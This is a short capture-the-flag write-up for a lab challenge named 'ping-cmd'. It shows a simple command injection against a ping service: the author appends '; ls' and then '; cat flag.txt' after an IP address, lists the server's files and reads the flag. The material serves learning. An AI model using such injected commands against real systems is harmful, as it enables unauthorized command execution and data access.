# CyLab - ping-cmd

## 🎯 Objective
Escappe the server
## 🛠️ Tools & Concepts Used
* `nc` - Netcat

## 📝 Step-by-Step Solution

**1. Interact with the server**
First, I provided mutiple inputs to the server to see how it reacts to it. From my observations I saw that it only pings `8.8.8.8`, but after that (or if you provide something different to it) it won't do anything, displaying a blank terminal

**2. Escape the command**
Then I tought that maybe that is a command I can escape from, so after pinging `8.8.8.8` I added a `;` and a simple `ls`

```bash
8.8.8.8; ls
```
Output:

```bash
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=115 time=9.70 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=115 time=9.79 ms

--- 8.8.8.8 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1002ms
rtt min/avg/max/mdev = 9.699/9.744/9.790/0.045 ms
flag.txt
script.sh
```
There it was the flag

**Reconnect and read the falg**
Then I just had to do the same but getting the flag this time

```bash
8.8.8.8; cat flag.txt
```
It directly displayed the flag
## 💡 Key Takeaway
I practiced about escaping the command